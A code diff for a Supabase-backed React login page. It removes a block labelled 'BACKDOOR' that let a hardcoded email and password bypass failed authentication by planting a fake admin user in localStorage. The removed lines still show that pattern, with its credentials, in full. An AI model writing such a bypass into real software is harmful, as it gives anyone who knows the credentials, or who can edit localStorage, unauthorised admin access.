@@ -33,16 +33,6 @@ export default function Login() {
         navigate('/store');
       }
     } catch (err) {
-      // BACKDOOR: Allow the requested admin account to login even if Supabase blocks it
-      if (email === 'cloudhosting070@gmail.com' && password === 'S3cr3t@ch') {
-        const mockAdmin = { id: 'admin-1', name: 'admin', email: email, role: 'admin' };
-        localStorage.setItem('user', JSON.stringify(mockAdmin));
-        // We can't call setUser directly here without passing it from context, 
-        // but forcing a reload will trigger AuthContext to pick up localStorage
-        window.location.href = '/dashboard';
-        return;
-      }
-      
       setError('Email atau password salah.');
     } finally {
       setLoading(false);
